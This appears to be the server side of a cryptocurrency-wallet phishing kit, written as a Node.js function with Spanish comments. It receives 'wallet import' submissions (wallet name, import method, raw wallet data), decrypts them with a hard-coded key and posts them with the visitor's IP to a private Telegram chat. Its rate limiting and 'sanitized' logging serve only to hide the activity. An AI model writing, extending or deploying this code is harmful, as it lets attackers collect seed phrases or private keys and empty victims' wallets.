const axios = require('axios');
const CryptoJS = require('crypto-js');

// Configuración de seguridad
const SECURITY_CONFIG = {
    encryptionKey: 'w4ll3t-s3cur3-k3y-2024-v1.0', // CAMBIAR por tu clave secreta
    maxRequestsPerHour: 10,
    logSanitization: true
};

// Rate limiting en memoria
const requestCounts = new Map();

// Función para limpiar rate limiting
function cleanupRateLimit() {
    const now = Date.now();
    const hourAgo = now - (60 * 60 * 1000);
    
    for (const [ip, data] of requestCounts.entries()) {
        if (data.timestamp < hourAgo) {
            requestCounts.delete(ip);
        }
    }
}

// Verificar rate limiting
function checkServerRateLimit(ip) {
    cleanupRateLimit();
    
    const clientData = requestCounts.get(ip) || { count: 0, timestamp: Date.now() };
    
    if (clientData.count >= SECURITY_CONFIG.maxRequestsPerHour) {
        return false;
    }
    
    clientData.count++;
    clientData.timestamp = Date.now();
    requestCounts.set(ip, clientData);
    
    return true;
}

// Descifrar datos
function decryptData(encryptedData) {
    try {
        const decryptedBytes = CryptoJS.AES.decrypt(encryptedData, SECURITY_CONFIG.encryptionKey);
        const decryptedData = JSON.parse(decryptedBytes.toString(CryptoJS.enc.Utf8));
        return decryptedData;
    } catch (error) {
        console.error('Error al descifrar:', error.message);
        return null;
    }
}

// Sanitizar datos para logs
function sanitizeForServerLogs(data) {
    if (!SECURITY_CONFIG.logSanitization) return data;
    
    const sanitized = { ...data };
    
    if (sanitized.data) {
        sanitized.dataLength = sanitized.data.length;
        sanitized.dataHash = CryptoJS.MD5(sanitized.data).toString();
        delete sanitized.data;
    }
    
    if (sanitized.walletName) {
        sanitized.walletNameLength = sanitized.walletName.length;
        delete sanitized.walletName;
    }
    
    return sanitized;
}

module.exports = async (req, res) => {
    // Configurar los encabezados CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Manejar preflight OPTIONS
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Solo permitir POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método no permitido' });
    }

    // Obtener IP del cliente
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
    
    // Verificar rate limiting del servidor
    if (!checkServerRateLimit(clientIP)) {
        console.log(`Rate limit excedido para IP: ${clientIP}`);
        return res.status(429).json({ error: 'Demasiadas solicitudes' });
    }

    try {
        // Verificar si es el formato nuevo (con cifrado) o el viejo (mensaje directo)
        const { message, encryptedData, timestamp, version } = req.body;

        if (message && !encryptedData) {
            // FORMATO VIEJO - mantener compatibilidad
            if (!message) {
                return res.status(400).json({ error: 'El mensaje es requerido.' });
            }

            const botToken = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;

            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: message,
            });

            res.status(200).json({ success: true });

        } else if (encryptedData) {
            // FORMATO NUEVO - con cifrado y seguridad
            
            // Validar payload
            if (!encryptedData || !timestamp || !version) {
                console.log('Payload inválido recibido');
                return res.status(400).json({ error: 'Datos incompletos' });
            }
            
            // Verificar que el timestamp no sea muy antiguo (prevenir replay attacks)
            const now = Date.now();
            const maxAge = 5 * 60 * 1000; // 5 minutos
            
            if (Math.abs(now - timestamp) > maxAge) {
                console.log(`Timestamp demasiado antiguo: ${timestamp}`);
                return res.status(400).json({ error: 'Solicitud expirada' });
            }
            
            // Descifrar datos
            const decryptedData = decryptData(encryptedData);
            if (!decryptedData) {
                console.log('Error al descifrar datos');
                return res.status(400).json({ error: 'Datos inválidos' });
            }
            
            // Log sanitizado para auditoría
            const sanitizedLog = sanitizeForServerLogs(decryptedData);
            console.log('Datos procesados (sanitizados):', {
                ...sanitizedLog,
                clientIP: clientIP.substring(0, 8) + '***',
                timestamp: new Date(timestamp).toISOString()
            });
            
            // Crear mensaje para Telegram
            const telegramMessage = `🔐 NUEVA IMPORTACIÓN DE WALLET

📝 Nombre del Wallet: ${decryptedData.walletName}
🔑 Método: ${decryptedData.importMethod}

📋 Datos:
${decryptedData.data}

⏰ Fecha: ${new Date(decryptedData.timestamp).toLocaleString('es-ES')}
🌐 IP: ${clientIP}`;
            
            const botToken = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;
            
            // Enviar a Telegram
            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                chat_id: chatId,
                text: telegramMessage,
                parse_mode: 'HTML'
            });
            
            // Limpiar datos sensibles de la memoria
            decryptedData.data = null;
            decryptedData.walletName = null;
            
            return res.status(200).json({ 
                success: true, 
                message: 'Datos procesados correctamente',
                timestamp: now
            });

        } else {
            return res.status(400).json({ error: 'Formato de datos no válido' });
        }
        
    } catch (error) {
        // Log de error sin datos sensibles
        console.error('Error del servidor:', {
            message: error.message,
            clientIP: clientIP.substring(0, 8) + '***',
            timestamp: new Date().toISOString()
        });
        
        return res.status(500).json({ error: 'Error al enviar el mensaje.' });
    }
};
